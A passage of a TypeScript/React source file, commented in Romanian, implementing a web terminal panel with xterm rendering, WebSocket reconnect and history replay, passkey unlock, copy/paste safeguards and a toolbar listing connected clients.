    //   • alt-buffer fără scrollback (less, man, vim) → scrollTop pe un viewport
    //     fără conținut ascuns = no-op vizibil.
    // Umplem exact acel gol: sintetizăm un WheelEvent la coordonatele atingerii,
    // pe care xterm îl rutează corect prin aceeași cale ca la desktop (secvențe
    // de mouse-wheel / săgeți sus-jos / scrollback). Cazul deja acoperit nativ
    // (normal + scrollback, fără mouse) îl lăsăm lui, ca să nu dublăm scroll-ul.
    let touchY: number | null = null
    const onTouchStart = (e: TouchEvent) => {
      touchY = e.touches.length === 1 ? e.touches[0].clientY : null   // pinch/zoom: lasă browserul
    }
    const onTouchMove = (e: TouchEvent) => {
      if (touchY === null || e.touches.length !== 1) return
      const mouseActive = term.modes.mouseTrackingMode !== 'none'
      const altBuffer = term.buffer.active.type === 'alternate'
      if (!mouseActive && !altBuffer) return                          // xterm îl tratează nativ
      const t = e.touches[0]
      const dy = touchY - t.clientY   // swipe în jos (dy<0) → conținut mai vechi, ca scroll-ul nativ
      touchY = t.clientY
      if (dy === 0) return
      e.preventDefault()              // noi conducem gestul: fără pan/zoom de pagină peste terminal
      term.element?.dispatchEvent(new WheelEvent('wheel', {
        deltaY: dy, deltaMode: 0, clientX: t.clientX, clientY: t.clientY,
        bubbles: true, cancelable: true,
      }))
    }
    const onTouchEnd = () => { touchY = null }
    containerRef.current!.addEventListener('touchstart', onTouchStart, { passive: true })
    containerRef.current!.addEventListener('touchmove', onTouchMove, { passive: false })
    containerRef.current!.addEventListener('touchend', onTouchEnd, { passive: true })
    containerRef.current!.addEventListener('touchcancel', onTouchEnd, { passive: true })

    const observer = new ResizeObserver(() => {
      fit.fit()
      sendResize()
    })
    observer.observe(containerRef.current!)

    // Renderer + image addon (ambele lazy, chunk-uri separate), apoi conectăm.
    //  - WebGL: rapid și FĂRĂ drop-ul de rânduri al renderer-ului DOM sub TUI-uri
    //    grele ca Claude Code (chenarul input-ului dispărea). Fallback: Canvas → DOM.
    //  - image addon (sixel/iTerm, WASM) TREBUIE încărcat DUPĂ renderer (layering).
    //  - conectăm abia la final: altfel replay-ul cu sixel s-ar randa ca text brut.
    const loadRenderer = async () => {
      const gen = ++rendererGenRef.current
      rendererRef.current?.dispose()   // la recreare (font change): scoate addon-ul vechi
      rendererRef.current = undefined
      if (termRef.current !== term) return
      try {
        const { WebglAddon } = await import('@xterm/addon-webgl')
        if (termRef.current !== term || gen !== rendererGenRef.current) return
        const webgl = new WebglAddon()
        webgl.onContextLoss(() => { webgl.dispose(); rendererRef.current = undefined })   // GPU reset → DOM
        term.loadAddon(webgl)
        rendererRef.current = webgl
        return
      } catch { /* WebGL indisponibil → Canvas */ }
      try {
        const { CanvasAddon } = await import('@xterm/addon-canvas')
        if (termRef.current !== term || gen !== rendererGenRef.current) return
        const canvas = new CanvasAddon()
        term.loadAddon(canvas)
        rendererRef.current = canvas
      } catch { /* renderer DOM implicit */ }
    }
    reloadRendererRef.current = () => { loadRenderer() }
    ;(async () => {
      await loadRenderer()
      try {
        const { ImageAddon } = await import('@xterm/addon-image')
        if (termRef.current === term) term.loadAddon(new ImageAddon())
      } catch { /* fără imagini */ }
      if (termRef.current === term) connect()
    })()
    term.focus()

    const container = containerRef.current
    return () => {
      observer.disconnect()
      container?.removeEventListener('pointerdown', markInput)
      container?.removeEventListener('pointerup', copyOnSelect)
      container?.removeEventListener('touchstart', onTouchStart)
      container?.removeEventListener('touchmove', onTouchMove)
      container?.removeEventListener('touchend', onTouchEnd)
      container?.removeEventListener('touchcancel', onTouchEnd)
      onData.dispose()
      onBinary.dispose()
      // Pentru un TIMER vrem valoarea curentă a ref-ului la cleanup, nu cea capturată la
      // montare — altfel am anula un timer care nu mai există şi l-am lăsa pe cel viu.
      // eslint-disable-next-line react-hooks/exhaustive-deps
      clearTimeout(retryRef.current.timer)
      clearTimeout(watchdogRef.current)
      if (remoteResizeReloadRef.current) clearTimeout(remoteResizeReloadRef.current)
      wsRef.current?.close()
      wsRef.current = null
      for (const d of decorationsRef.current) d.dispose()
      decorationsRef.current = []
      trackerRef.current?.dispose()
      trackerRef.current = undefined
      clearCwd(session.id)
      ;(window as unknown as { __wtTerms?: Map<string, Terminal> }).__wtTerms?.delete(session.id)
      term.dispose()
      termRef.current = undefined
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [session.id])

  // Recalibrare per dispozitiv: fontul preferat se re-evaluează când tabul devine
  // activ, la rotire/redimensionare (clasa de lățime se poate schimba) și când
  // A± îl modifică din orice alt panou montat (evenimentul 'wt-font') — toate
  // taburile browserului ăstuia stau la aceeași valoare, cea potrivită lui.
  // Persistarea NU se mai face aici: doar setPreferredFont() scrie în storage,
  // altfel montarea îngheța default-ul de lățime la prima vizită (bug istoric).
  useEffect(() => {
    const sync = () => setFontSize(preferredFont())
    if (props.paneActive !== false) sync()
    // 'storage' e canalul ÎNTRE ferestre (popout-uri, alt tab de browser): 'wt-font'
    // nu trece de fereastra curentă, iar fără sync un A± în popout ar calcula din
    // state vechi și ar trage preferința comună înapoi (18 → 15, observat în audit)
    const onStorage = (e: StorageEvent) => { if (e.key === FONT_STORAGE_KEY) sync() }
    window.addEventListener('wt-font', sync)
    window.addEventListener('resize', sync)
    window.addEventListener('storage', onStorage)
    return () => {
      window.removeEventListener('wt-font', sync)
      window.removeEventListener('resize', sync)
      window.removeEventListener('storage', onStorage)
    }
  }, [props.paneActive])

  // paneActive prin ref, ca efectul de font să NU ruleze la schimbarea tabului
  // (ar recrea rendererul degeaba) — îl citește doar când chiar se schimbă fontul
  const paneActiveRef = useRef(props.paneActive)
  paneActiveRef.current = props.paneActive
  useEffect(() => {
    const term = termRef.current
    if (!term) return
    term.options.fontSize = fontSize
    fitRef.current?.fit()
    // panoul activ reclamă dimensiunea (A± e acțiune deliberată a operatorului);
    // un tab de fundal care doar se aliniază la preferință anunță pasiv, ca să
    // nu smulgă PTY-ul de la dispozitivul care chiar folosește sesiunea aia.
    // `document.hasFocus()` e obligatoriu: un POPOUT (fereastră separată) care se
    // aliniază la un font sync venit prin evenimentul `storage` are paneActive=true
    // (n-are split), deci ar reclama dimensiunea deși e în fundal — smulgând PTY-ul
    // de la fereastra activă. Cu focus real, un A± deliberat (în orice fereastră
    // focalizată) tot trece; un sync pasiv într-o fereastră de fundal nu. (Audit 2026-08.)
    sendResize(paneActiveRef.current !== false && document.hasFocus())
    // WebGL rămâne gol la schimbarea fontului (nici clearTextureAtlas nu repară) →
    // recreăm renderer-ul la noua dimensiune. Font change e rar/deliberat, deci
    // costul recreării e acceptabil.
    reloadRendererRef.current?.()
  }, [fontSize, sendResize])

  // schema de culori a terminalului se aplică live (fără reload), inclusiv
  // override-ul per-host și editarea schemei proprii din Setări
  useEffect(() => {
    const apply = () => {
      const t = termTheme(hostScheme(props.host?.id))
      const term = termRef.current
      if (term) {
        term.options.theme = t
        term.refresh(0, term.rows - 1)   // DOM renderer: force repaint with new colors
      }
      setTermBg(t.background || '#0b0e14')
    }
    apply()
    window.addEventListener('wt-termscheme', apply)
    return () => window.removeEventListener('wt-termscheme', apply)
  }, [props.host?.id])

  // deschis dintr-un rezultat de căutare: pornește căutarea xterm pe termen
  // (reacționează și când e reselectat același sid din alt rezultat)
  useEffect(() => {
    if (!props.initialSearch) return
    setShowSearch(true)
    setSearch(props.initialSearch)
    // căutarea efectivă rulează la finalul replay-ului de istoric (callback-ul
    // din term.write); timeout-ul rămâne doar fallback pentru sesiuni deja pline
    pendingFindRef.current = props.initialSearch
    const t = setTimeout(() => {
      if (pendingFindRef.current) searchRef.current?.findPrevious(pendingFindRef.current)
    }, 1500)
    return () => clearTimeout(t)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [props.searchNonce])

  function connect() {
    // Guard anti-dublă-conexiune: connect() e chemat din mai multe locuri (montare,
    // timer-ul de reconnect din onclose, reconectare telnet, calea de exit) care pot
    // cursa. Fără asta, un socket vechi rămânea deschis în paralel cu cel nou —
    // ambele primeau tail-ul + output, dublând istoricul și RTT-ul. Închidem orice
    // socket anterior (neutralizându-i onclose ca să NU declanșeze încă un reconnect)
    // și anulăm retry-ul pending înainte de a deschide unul nou.
    clearTimeout(retryRef.current.timer)
    clearTimeout(watchdogRef.current)
    const stale = wsRef.current
    if (stale) {
      stale.onopen = stale.onmessage = stale.onclose = stale.onerror = null
      try { stale.close() } catch { /* deja închis */ }
    }
    const proto = window.location.protocol === 'https:' ? 'wss' : 'ws'
    const ws = new WebSocket(`${proto}://${window.location.host}/ws/sessions/${session.id}`)
    ws.binaryType = 'arraybuffer'
    wsRef.current = ws
    setConn('connecting')

    // resetat la FIECARE mesaj (date sau ping); dacă expiră, socketul e half-open → close
    const petWatchdog = () => {
      clearTimeout(watchdogRef.current)
      watchdogRef.current = setTimeout(() => {
        try { ws.close() } catch { /* deja închis */ }   // → onclose → reconnect cu backoff
      }, WATCHDOG_MS)
    }

    ws.onopen = () => {
      retryRef.current.delay = 1000
      petWatchdog()
      expectTailRef.current = true
      setReplaying(true)
      // sesiune moartă: NU trece pe 'open' (rămâne 'ended') — altfel gardul din onclose
      // se anulează și fetch-ul one-shot de istoric devine o buclă infinită de reconnect
      if (!exitedRef.current) setConn('open')
      sendResize()
      // reconectare cât tab-ul e ascuns: pune pauza la loc imediat după tail
      if (!streamActiveRef.current) {
        ws.send(JSON.stringify({ type: 'pause' }))
      }
    }
    ws.onmessage = (ev) => {
      petWatchdog()   // orice mesaj (date sau ping) = conexiune vie → re-armează watchdog-ul
      const term = termRef.current
      if (!term) return
      if (typeof ev.data === 'string') {
        const msg = JSON.parse(ev.data)
        if (msg.type === 'ping') {
          ws.send(JSON.stringify({ type: 'pong', n: msg.n }))
        } else if (msg.type === 'rtt') {
          const t0 = rttSentRef.current.get(msg.n)
          if (t0 != null) {
            rttSentRef.current.delete(msg.n)
            setRtt(Math.round(performance.now() - t0))
          }
        } else if (msg.type === 'init') {
          yourIdRef.current = msg.your_id ?? null   // ca să ne marcăm în roster
        } else if (msg.type === 'roster') {
          setRoster(Array.isArray(msg.clients) ? msg.clients : [])
        } else if (msg.type === 'attached') {
          // Cineva ni s-a alăturat la sesiune. Roster-ul se actualiza tăcut, deci aflai doar
          // dacă te uitai fix atunci — iar dacă lucrai, nu te uitai. Notificarea de sistem
          // ajunge şi când tabul e în fundal; `known:false` o ridică la ton de avertisment.
          const c = msg.client || {}
          const who = c.label === 'guest' ? tRef.current('session.roleGuest') : tRef.current('session.roleSelf')
          notify(
            c.known === false
              ? tRef.current('session.attachedNew', { title: session.title || session.id.slice(0, 8) })
              : tRef.current('session.attachedKnown', { who, title: session.title || session.id.slice(0, 8) }),
            tRef.current('session.attachedBody', { ip: c.ip || '?', agent: shortAgent(c.agent) }),
            c.known === false ? 'warn' : 'info',
            'wt-attach-' + session.id)
        } else if (msg.type === 'exit' || msg.type === 'lost') {
          setExited(msg.type === 'exit'
            ? { status: msg.status, reason: 'exited' }
            : { status: null, reason: msg.reason })
          setConn('ended')
          exitedRef.current = true
          props.onChanged()
          // secvența de moarte a clientului tmux tocmai a șters ecranul;
          // reconectăm O SINGURĂ DATĂ ca să primim istoricul filtrat pentru sesiuni închise
          // (exitedRef ține fetch-ul one-shot — onopen nu trece pe 'open', onclose nu reia)
          term.reset()
          ws.close()
          setTimeout(() => {
            if (termRef.current) connect()
          }, 300)
        } else if (msg.type === 'locked') {
          setLocked(true); setLockErr('')
        } else if (msg.type === 'unlocked') {
          setLocked(false); setUnlocking(false); setLockErr('')
        } else if (msg.type === 'unlock_failed') {
          setUnlocking(false); setLockErr(t('session.passkeyInvalid'))
        } else if (msg.type === 'resize') {
          term.resize(msg.cols, msg.rows)
          // Resize venit de la server (alt client atașat la aceeași sesiune a
          // schimbat dimensiunea PTY-ului partajat). NU chemăm `fit()` aici: ne
          // aliniem la dimensiunea PTY-ului (a celuilalt client), nu la containerul
          // nostru local — altfel am retrimite un resize și am reaprinde bătaia de
          // redimensionări între dispozitive.
          term.refresh(0, term.rows - 1)   // repaint imediat (best-effort)
          // Cu renderer WebGL, `term.resize` + refresh NU sunt de ajuns — canvasul
          // rămâne uneori complet GOL deși bufferul e corect; doar A−/A+, care
          // RECREEAZĂ rendererul, îl repara manual. Așa că recreăm rendererul, la
          // fel ca A−/A+ — dar DEBOUNCED: în timpul „bătăii" de dimensiuni resize-urile
          // vin în rafală, deci o singură recreare după ce se așază (fără thrash).
          if (remoteResizeReloadRef.current) clearTimeout(remoteResizeReloadRef.current)
          remoteResizeReloadRef.current = window.setTimeout(() => {
            remoteResizeReloadRef.current = null
            reloadRendererRef.current?.()
          }, 200)
        } else if (msg.type === 'resync') {
          // NU golim ecranul aici: reset-ul se face atomic chiar înainte de a scrie tail-ul
          // (vezi ramura expectTail). Altfel, cât aşteptăm tail-ul (sau dacă e gol/întârziat),
          // ecranul rămâne alb — exact simptomul raportat. Cortina de replay acoperă tranziţia.
          expectTailRef.current = true
          setReplaying(true)
        }
      } else if (expectTailRef.current) {
        expectTailRef.current = false
        muteRef.current = true
        // re-măsoară EXACT înainte de replay: la schimbarea tab-ului, fit()-ul
        // de la montare poate prinde containerul la mijlocul tranziției de
        // layout — istoricul s-ar randa la alte dimensiuni decât cele finale
        // (linii trunchiate / aliniament stricat până la un nou click pe tab).
        // Tail-ul vine la ≥1 RTT după montare, când layout-ul e deja așezat.
        fitRef.current?.fit()
        // reset ÎNAINTE de replay: serverul trimite tail-ul complet la FIECARE
        // conectare, deci la o reconectare (rețea căzută, sleep) istoricul s-ar
        // apenda a doua oară peste conținutul existent
        const modeSeq = modeRestoreSeq(term.modes)   // salvat ÎNAINTE de reset
        term.reset()
        if (modeSeq) term.write(modeSeq)             // vezi modeRestoreSeq
        // Marcajele OSC 133 din ISTORICUL rejucat NU sunt evenimente live: dacă le lăsăm
        // să treacă, tracker-ul construieşte „comenzi" din rânduri rejucate (prompturi,
        // bucăţi de output) şi le raportează în istoricul global — la fiecare reconectare.
        // Văzut în producţie: 17 intrări false, toate cu aceeaşi secundă. Le ignorăm cât
        // scriem, iar tracker-ul porneşte curat (term.reset() i-a invalidat oricum rândurile).
        replayRef.current = true
        trackerRef.current?.reset()
        term.write(new Uint8Array(ev.data), () => {
          replayRef.current = false
          muteRef.current = false
          // reconciliere post-replay: dacă dimensiunile s-au schimbat cât timp
          // scriam (redimensionare de fereastră, sidebar închis), aliniem
          // xterm-ul și anunțăm serverul (tmux redesenează la SIGWINCH)
          fitRef.current?.fit()
          sendResize()
          setReplaying(false)
          // căutarea pornită dintr-un rezultat global rulează abia acum, pe
          // bufferul complet (timeout-ul din efect rămâne doar fallback)
          if (pendingFindRef.current) {
            searchRef.current?.findPrevious(pendingFindRef.current)
            pendingFindRef.current = null
          }
        })
      } else {
        const bytes = new Uint8Array(ev.data)
        // cât rulează o comandă, dăm octeţii şi tracker-ului: output-ul „exact" (clipboard,
        // markdown) se ia din FLUX, nu de pe ecran — sub tmux panoul e repictat asincron
        // faţă de marcaje, iar extragerea din rânduri ieşea când prea lungă, când goală.
        if (trackerRef.current?.running) {
          trackerRef.current.feed(streamDecoderRef.current.decode(bytes, { stream: true }))
        }
        term.write(bytes)
      }
    }
    ws.onclose = () => {
      wsRef.current = null
      clearTimeout(watchdogRef.current)
      if (!termRef.current) return // component unmounted
      // sesiune moartă: fetch-ul de istoric e one-shot — nu reprograma reconnect (gardă
      // directă pe exitedRef, robustă chiar dacă starea conn a fost cumva alterată)
      if (exitedRef.current) return
      setConn((prev) => {
        if (prev === 'ended') return prev
        // backoff exponențial + jitter: la eșec persistent (ex. host offline)
        // nu batem serverul în ritm fix; jitterul evită sincronizarea reîncercărilor
        const base = retryRef.current.delay
        const wait = Math.round(base * (0.7 + Math.random() * 0.6))
        retryRef.current.timer = setTimeout(() => {
          if (termRef.current) connect()
        }, wait)
        retryRef.current.delay = Math.min(base * 2, 20000)
        return 'reconnecting'
      })
    }
  }

  // -- actions ---------------------------------------------------------------

  // Reconectare telnet-bastion: deschide un telnet NOU spre aceeași țintă, pe același
  // sid/tab. Starea veche a device-ului nu se resuscită (telnet e stateful pe socket) —
  // aterizezi la un prompt nou, cu transcriptul păstrat continuu.
  async function reconnectTelnet() {
    setReconnecting(true)
    try {
      // host cu 2FA fără fereastră deschisă → 403 → step-up + reîncercare (H1)
      await withStepup(session.host_id, () =>
        api(`/api/sessions/${session.id}/reconnect`, { method: 'POST', body: JSON.stringify({}) }))
      setExited(null)
      exitedRef.current = false     // reconectare manuală: sesiunea nu mai e „moartă"
      retryRef.current.delay = 1000
      connect()
      props.onChanged()
    } catch (e) {
      const m = errText(e, t) || t('session.reconnectFailed')
      termRef.current?.write(`\r\n\x1b[31m[webterm: ${m}]\x1b[0m\r\n`)
    } finally {
      setReconnecting(false)
    }
  }

  // Deblocare idle-lock (host cu 2FA): ceremonie passkey → grant → trimis pe WS.
  // Serverul validează şi răspunde 'unlocked' (sau 'unlock_failed').
  async function reauth() {
    setUnlocking(true); setLockErr('')
    try {
      const cred = props.stepupCredential
        ? await props.stepupCredential(session.host_id)
        : await (async () => {
            const options = await api<Record<string, unknown>>('/api/webauthn/stepup/options', {
              method: 'POST', body: JSON.stringify({ host_id: session.host_id }),
            })
            const credential = await startAuthentication({ optionsJSON: options as never })
            const r = await api<{ grant: string }>('/api/webauthn/stepup/verify', {
              method: 'POST', body: JSON.stringify({ host_id: session.host_id, credential }),
            })
            return { stepup_grant: r.grant, stepup_password: undefined }
          })()
      if (!cred) { setUnlocking(false); return }        // anulat de utilizator
      wsRef.current?.send(JSON.stringify({
        type: 'unlock', grant: cred.stepup_grant ?? '', password: cred.stepup_password ?? '',
      }))
      // 'unlocked' de la server curăţă `locked`/`unlocking`
    } catch (e) {
      setUnlocking(false)
      setLockErr(errText(e, t) || t('session.passkeyAuthFailed'))
    }
  }

  async function saveMeta(next: { title?: string; note?: string }) {
    await api(`/api/sessions/${session.id}`, {
      method: 'PATCH',
      body: JSON.stringify(next),
    }).catch(() => {})
    props.onChanged()
  }

  async function copySelection() {
    const sel = termRef.current?.getSelection()
    if (sel) {
      if (await copyText(sel)) {
        setCopied(true)
        setTimeout(() => setCopied(false), 1200)
      }
    }
  }

  // -- comenzi (OSC 133) -----------------------------------------------------

  const jumpTo = (c: Command) => {
    const term = termRef.current
    if (!term) return
    // scroll ca rândul comenzii să fie în capul viewportului
    term.scrollToLine(Math.max(0, c.startMarker.line - 1))
    activeCmdRef.current = c.id                 // imediat, pt. Alt+↑/↓ consecutive
    setActiveCmd(c.id)
  }

  const stepCommand = (dir: 1 | -1) => {
    const cmds = trackerRef.current?.commands ?? []
    if (!cmds.length) return
    const cur = activeCmdRef.current
    const idx = cur == null
      ? (dir === -1 ? cmds.length - 1 : 0)
      : Math.min(cmds.length - 1, Math.max(0, cmds.findIndex((c) => c.id === cur) + dir))
    const next = cmds[idx]
    if (next) jumpTo(next)
  }

  const copyOutput = async (c: Command) => {
    const text = trackerRef.current?.outputOf(c)
    // null = nu putem extrage output-ul cu certitudine (comanda încă rulează,
    // rândurile au ieșit din scrollback). Mai bine spunem asta decât să punem
    // în clipboard o felie greșită — care, lipită într-un shell, s-ar EXECUTA.
    if (text == null) {
      alert(t('session.cannotExtractOutput'))
      return
    }
    if (!text) return
    // plafon de dimensiune, ca la OSC 52: un output uriaș nu trebuie să umple
    // clipboardul cu megaocteți dintr-un singur click
    if (await copyText(text.slice(0, 200_000))) {
      setCopied(true)
      setTimeout(() => setCopied(false), 1200)
    }
  }

  const flashCopied = (ok: boolean) => {
    if (!ok) return                       // vezi nota de la celălalt flashCopied
    setCopied(true); setTimeout(() => setCopied(false), 1200)
  }

  // „Rulează din nou": pune comanda la prompt, DAR nu apasă Enter — o vezi și o
  // execuți tu. Deliberat: o comandă veche re-executată orbește (ex. un `rm`) e
  // exact genul de accident pe care nu vrem să-l facem ușor.
  const rerun = (c: Command) => {
    send(c.text)
    termRef.current?.focus()
  }

  const copyCommand = async (c: Command) => {
    flashCopied(await copyText(c.text))
  }

  // „Ca markdown": comandă + output + exit/durată, gata de lipit într-un ticket/chat.
  const copyMarkdown = async (c: Command) => {
    const out = trackerRef.current?.outputOf(c)
    const meta = [c.exitCode != null ? `exit ${c.exitCode}` : null, c.endedAt ? cmdDuration(c) : null]
      .filter(Boolean).join(' · ')
    const body = out == null ? t('session.outputUnavailable') : out.slice(0, 200_000).replace(/\n+$/, '')
    const md = '```console\n$ ' + c.text + (meta ? `   # ${meta}` : '') + '\n' + body + '\n```\n'
    flashCopied(await copyText(md))
  }

  /** Instalează integrarea shell RULÂND comanda în sesiunea curentă: o vezi
      tastată, deci știi exact ce se execută pe serverul tău. */
  const setupShellIntegration = async () => {
    try {
      const r = await api<{ command: string }>('/api/shell-integration/command')
      // Butonul tastează ~700 de caractere ŞI apasă Enter, orbeşte. Dacă sesiunea nu e la
      // un prompt — `sudo`, `mysql -p`, `ssh-add`, vim — payload-ul devine altceva: testat,
      // la un `read -s -p "Password:"` ajunge valoarea parolei. Restul produsului cere
      // confirmare pentru lucruri mult mai puţin periculoase; ăsta nu cerea nimic.
      if (!confirm(t('session.confirmShellIntegration'))) return
      send(r.command + '\n')
      termRef.current?.focus()
    } catch {
      alert(t('session.cannotGetSetupCommand'))
    }
  }

  async function paste() {
    const text = await readText()
    // Citirea nu are cale de rezervă: `execCommand('paste')` e blocat peste tot, iar
    // `navigator.clipboard` lipseşte pe origini nesecurizate. Spunem asta în loc să
    // pară că butonul nu face nimic — Ctrl+V direct în terminal merge oricum.
    if (text === null) {
      alert(t('session.clipboardBlocked'))
      return
    }
    // prin xterm.paste(), nu send() direct: doar așa textul e împachetat în
    // bracketed paste (\x1b[200~…) — altfel un paste multi-linie execută
    // fiecare linie imediat în shell și strică indentarea în vim/nano
    if (text) termRef.current?.paste(text)
    termRef.current?.focus()
  }

  async function killSession() {
    if (!confirm(t('session.confirmKill'))) return
    // host cu 2FA → 403 de step-up: withStepup rulează ceremonia passkey și reîncearcă o dată
    await withStepup(session.host_id, () =>
      api(`/api/sessions/${session.id}/kill`, { method: 'POST' })).catch((e) => alert(e.message))
  }

  async function deleteSession() {
    if (!confirm(t('session.confirmDelete'))) return
    try {
      await api(`/api/sessions/${session.id}`, { method: 'DELETE' })
      props.onDeleted()
    } catch (e) {
      alert(errText(e, t) || t('session.deleteFailed'))
    }
  }

  // „reconectare…" DOAR pentru sesiuni vii — la o sesiune terminată bucla de
  // reconectare (care aduce istoricul) nu trebuie să pară o problemă de conexiune
  const connBadge =
    isLive && (conn === 'reconnecting' || conn === 'connecting')
      ? { text: t('session.reconnecting'), cls: 'bg-amber-900/70 text-amber-200' }
      : null

  const hostAccent = props.host ? hostColor(props.host) : '#64748b'
  const reach = props.host ? reachState(props.host) : 'offline'

  return (
    <div ref={rootRef} className={`wt-window flex h-full flex-col ${props.activeInSplit ? 'ring-2 ring-inset ring-sky-500/70' : ''}`}>
      {/* bandă de identitate = culoarea host-ului (o vezi și în tab) */}
      <div className="h-[3px] shrink-0" style={{ background: hostAccent }} aria-hidden="true" />
      {/* header (titlebar în tema macOS) */}
      {/* min-w-0 + gap mai mic pe mobil: fără ele, badge-ul hostului și butoanele
          împing toolbarul în afara ecranului (iPhone SE / Galaxy S9) */}
      <header className="flex min-w-0 items-center gap-1 border-b border-ink-800 bg-ink-900 px-2 py-2 md:gap-2 md:px-3">
        <button onClick={props.onMenu} aria-label={t('session.openHostList')} className={`wt-touch shrink-0 rounded-md px-2 py-1 text-slate-400 hover:bg-ink-800 ${props.sidebarCollapsed ? '' : 'md:hidden'}`}>
          ☰
        </button>
        {props.host && (
          <span className="flex min-w-0 shrink items-center gap-1.5 rounded-md px-1.5 py-1"
            style={{ background: `${hostAccent}1f` }}
            title={`${props.host.name} · ${protoLabel(props.host)} · ${reach === 'online' ? 'online' : reach === 'ondemand' ? t('session.onDemand') : 'offline'}`}>
            <span className={`h-2 w-2 shrink-0 rounded-full ${reach === 'online' ? 'dot-live' : ''}`}
              style={{ background: reach === 'offline' ? '#64748b' : hostAccent }} />
            <span className="max-w-[120px] truncate font-mono text-xs font-medium md:max-w-[220px]" style={{ color: hostAccent }}>
              {hostAt(props.host)}
            </span>
          </span>
        )}
        {/* titlul: ascuns pe telefoane înguste (tab-ul îl arată oricum) — altfel
            nu mai încap nici butoanele esențiale */}
        <div className="group/title relative hidden min-w-0 flex-1 items-center sm:flex">
          <input
            value={title}
            aria-label={t('session.sessionTitle')}
            title={t('session.clickToRename')}
            placeholder={t('session.sessionPlaceholder')}
            onChange={(e) => setTitle(e.target.value)}
            onBlur={() => title !== session.title && saveMeta({ title })}
            onKeyDown={(e) => e.key === 'Enter' && (e.target as HTMLInputElement).blur()}
            className="wt-ghost min-w-0 flex-1 truncate rounded-md bg-transparent py-1 pl-2 pr-7 text-sm font-medium ring-1 ring-transparent hover:bg-ink-800 hover:ring-ink-700 focus:bg-ink-800 focus:ring-transparent"
          />
          {/* semnal de „editabil": creion vizibil la hover/focus în cadrul câmpului */}
          <span className="pointer-events-none absolute right-2 text-slate-500 opacity-0 transition-opacity group-hover/title:opacity-100 group-focus-within/title:opacity-100" aria-hidden="true">
            <PencilIcon />
          </span>
        </div>
        <span role="status" aria-live="polite" className="shrink-0">
          {connBadge && (
            <span className={`rounded px-2 py-0.5 text-xs ${connBadge.cls}`}>{connBadge.text}</span>
          )}
        </span>
        <div className="ml-auto flex shrink-0 items-center gap-0.5">
          {/* Pe mobil ține DOAR esențialul în bară (căutare + paste); restul
              intră în meniul ⋯. Pe iPhone SE, cinci butoane + badge + titlu
              împingeau toolbarul afară din ecran. */}
          <ToolButton title={t('session.searchScrollback', { shortcut: shortcutFor('search') })} active={showSearch} onClick={() => setShowSearch(!showSearch)}><SearchIcon /></ToolButton>
          {/* comenzi (OSC 133): navighezi între ele cu Alt+↑/↓ */}
          <span className="hidden sm:contents">
            <ToolButton
              title={commands.length ? t('session.commandsCount', { count: commands.length }) : t('session.commandsActivate')}
              active={showCommands}
              onClick={toggleCommands}
            >
              <span className="font-mono text-xs">⌘{commands.length > 0 ? commands.length : ''}</span>
            </ToolButton>
          </span>
          {/* fișiere: navighezi/editezi/transferi; urmărește cwd-ul din terminal */}
          <span className="hidden sm:contents">
            <ToolButton title={t('session.filesTooltip')} active={showFiles} onClick={toggleFiles}>
              <FilesIcon />
            </ToolButton>
          </span>
          {/* git: status/diff/stage/commit pe repo-ul din cwd-ul terminalului */}
          <span className="hidden sm:contents">
            <ToolButton title={t('session.gitTooltip')} active={showGit} onClick={toggleGit}>
              <GitBranchIcon />
            </ToolButton>
          </span>
          {/* port forwards: expune servicii web de pe host prin browser */}
          <span className="hidden sm:contents">
            <ToolButton title={t('session.forwardsTooltip')} active={showForwards} onClick={toggleForwards}>
              <ForwardIcon />
            </ToolButton>
          </span>
          {isLive && (
            <span className="hidden sm:contents">
              <SnippetsMenu
                open={snippetsOpen}
                onOpenChange={setSnippetsOpen}
                onInsert={(b) => { send(b); termRef.current?.focus() }}
              />
            </span>
          )}
          <ToolButton title={t('session.paste')} onClick={paste}><PasteIcon /></ToolButton>

          {/* Secundar: inline doar pe ecrane mari. Pe tablete (iPad Mini/Pro),
              zece butoane × 44px (ținte tactile) depășeau lățimea — trec în ⋯. */}
          <div className="hidden items-center gap-0.5 lg:flex">
            <span className="mx-0.5 h-4 w-px bg-ink-700" aria-hidden="true" />
            <ToolButton title={t('session.linksTooltip')} active={linksOpen} onClick={openLinks}><ExternalLinkIcon /></ToolButton>
            <ToolButton title={t('session.note')} active={showNote} onClick={() => setShowNote(!showNote)}><NoteIcon /></ToolButton>
            <ToolButton title={t('session.copySelection')} onClick={copySelection}>{copied ? '✓' : <CopyIcon />}</ToolButton>
            <ToolButton title={t('session.fontSmaller')} onClick={() => setPreferredFont(fontSize - 1)}>A−</ToolButton>
            <ToolButton title={t('session.fontLarger')} onClick={() => setPreferredFont(fontSize + 1)}>A+</ToolButton>
            {!props.popout && (
              <ToolButton title={t('session.shareLinkTooltip')} active={!!shareUrl || shareOpen} onClick={share}><LinkIcon /></ToolButton>
            )}
            {/* roster: apare când mai e cineva conectat; owner-ul poate da kick */}
            {roster.length > 1 && (
              <div className="relative">
                <button
                  onClick={() => setShowRoster((v) => !v)}
                  title={t('session.whoConnected')}
                  className="flex items-center gap-1 rounded-md px-2 py-1 text-xs text-slate-300 ring-1 ring-ink-700 hover:bg-ink-800"
                >👁 {roster.length}</button>
                {showRoster && (
                  <>
                    <div className="fixed inset-0 z-30" onClick={() => setShowRoster(false)} />
                    <div className="absolute right-0 top-full z-40 mt-1 w-72 rounded-lg bg-ink-900 p-1.5 text-xs ring-1 ring-ink-700 shadow-xl">
                      <div className="px-2 py-1 text-[11px] uppercase tracking-wide text-slate-500">{t('session.connectedCount', { count: roster.length })}</div>
                      {roster.map((c) => (
                        <div key={c.id} className="rounded py-0.5 hover:bg-ink-800">
                          <div className="flex items-center gap-2 px-2 py-1">
                          <span className="min-w-0 flex-1 truncate text-slate-200">
                            {c.label === 'self' ? t('session.roleSelf')
                              : c.label === 'guest' ? t('session.roleGuest')
                              : c.label}{c.id === yourIdRef.current ? ` ${t('session.you')}` : ''}
                          </span>
                          {c.owner
                            ? <span className="shrink-0 text-[10px] text-slate-500">owner</span>
                            : <span className={`shrink-0 text-[10px] ${c.writable ? 'text-amber-400' : 'text-slate-500'}`}>{c.writable ? t('session.canWrite') : t('session.canView')}</span>}
                          {!c.owner && (
                            <button onClick={() => kick(c.id)} title={t('session.removeFromSession')}
                              className="shrink-0 rounded px-1 text-rose-400 hover:bg-ink-700">✕</button>
                          )}
                          </div>
                          {/* De unde e ataşat. Fără asta „mai e cineva conectat" nu-ţi spunea
                              dacă e telefonul tău sau altcineva — deci nu puteai reacţiona. */}
